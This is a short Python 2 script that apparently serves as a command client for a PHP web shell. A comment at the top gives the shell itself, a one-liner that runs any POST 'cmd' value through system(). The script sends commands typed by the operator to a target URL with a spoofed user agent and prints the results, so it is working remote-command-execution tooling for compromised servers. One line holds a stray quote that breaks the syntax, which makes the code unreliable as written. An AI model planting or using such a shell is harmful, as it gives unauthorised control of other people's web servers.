#!/usr/bin/python
# Use with this php webshell:
# abcdef666 <?php echo system($_POST['cmd']); ?> abcdef666
 
import sys
import requests

magic_string = "abcdef666"

def find_between( s, match ):
 try:
  start = s.index( match ) + len( match )
  end   = s.index( match, start )
  return s[start:end]
 except ValueError:
  return ""
 
url = sys.argv[1]
print "[+] Connecting to webshell client ..."
 
while True:
    comm = raw_input("~$ ")
    if comm == "quit":
        break
    headers = {'user-agent':'Mozilla/4.0'}
    #proxy = {'http':'http://127.0.0.1:8080'}
    #data = {'cmd' : comm + " 2>&1"}
    data = {'cmd' : comm"}
    #r=requests.post(url, headers=headers, proxies=proxy, data=data)
    try:
        r=requests.post(url, headers=headers, data=data)
        print find_between(r.text, magic_string)
    except:
        print r.text
